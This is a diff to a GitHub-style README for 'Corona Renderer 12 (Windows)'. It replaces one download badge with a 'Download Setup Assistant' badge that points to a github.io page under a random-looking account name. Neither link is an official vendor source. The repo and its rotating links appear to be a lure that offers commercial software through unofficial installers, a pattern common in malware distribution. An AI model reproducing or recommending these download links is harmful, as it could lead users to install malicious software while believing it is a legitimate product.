@@ -5,13 +5,7 @@
 
 <h1 align="center">🌞 Corona Renderer 12 (Windows)</h1>
 
-<p align="center">
-  <a href="https://corona-renderer-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Corona%20Renderer-Windows%2010%2F11-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Corona Renderer for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://perazajanijillj.github.io/.github/corona-renderer-tool)
 
 <p align="center">
   <img src="https://i.ytimg.com/vi/HTZUa0xPOfw/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLACWL1D1wZzHyHXctjluLLUQUjAXA" alt="Corona Renderer interactive rendering preview in a 3D scene" width="700" />
